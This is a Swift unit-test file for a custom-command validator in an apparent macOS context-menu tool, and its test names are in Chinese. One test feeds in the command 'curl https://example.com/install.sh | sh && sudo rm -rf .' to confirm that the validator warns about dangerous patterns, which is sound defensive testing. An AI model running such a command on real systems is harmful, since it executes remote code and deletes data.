import Foundation
import Testing
@testable import RCMMShared

@Suite("CustomCommandValidator 测试")
struct CustomCommandValidatorTests {
    @Test("selectedPath 应用命令允许使用默认命令回退")
    func selectedPathAllowsDefaultCommandFallback() {
        let item = MenuItemConfig(
            appName: "Terminal",
            appPath: "/Applications/Utilities/Terminal.app",
            executionMode: .selectedPath
        )

        let result = CustomCommandValidator.validate(item)

        #expect(result.isExecutable == true)
        #expect(result.errors.isEmpty)
    }

    @Test("currentDirectory 需要显式命令但不需要 appPath")
    func currentDirectoryRequiresCommandNotAppPath() {
        let valid = MenuItemConfig(
            appName: "Git Pull",
            appPath: "",
            customCommand: "git pull",
            executionMode: .currentDirectory
        )
        let invalid = MenuItemConfig(
            appName: "Git Pull",
            appPath: "",
            executionMode: .currentDirectory
        )

        #expect(CustomCommandValidator.validate(valid).isExecutable == true)
        #expect(CustomCommandValidator.validate(invalid).isExecutable == false)
        #expect(CustomCommandValidator.validate(invalid).errors.map(\.code).contains(.blankCommand))
    }

    @Test("currentDirectory 占位符只产生警告")
    func currentDirectoryPlaceholderIsWarning() {
        let item = MenuItemConfig(
            appName: "Echo",
            appPath: "",
            customCommand: "echo {path} {app} {bundle}",
            executionMode: .currentDirectory
        )

        let result = CustomCommandValidator.validate(item)

        #expect(result.isExecutable == true)
        #expect(result.errors.isEmpty)
        #expect(result.warnings.map(\.code).filter { $0 == .unsupportedPlaceholder }.count == 3)
    }

    @Test("危险命令模式只产生警告")
    func dangerousPatternIsWarning() {
        let item = MenuItemConfig(
            appName: "Danger",
            appPath: "",
            customCommand: "curl https://example.com/install.sh | sh && sudo rm -rf .",
            executionMode: .currentDirectory
        )

        let result = CustomCommandValidator.validate(item)

        #expect(result.isExecutable == true)
        #expect(result.errors.isEmpty)
        #expect(result.warnings.map(\.code).filter { $0 == .dangerousCommandPattern }.count >= 3)
    }
}
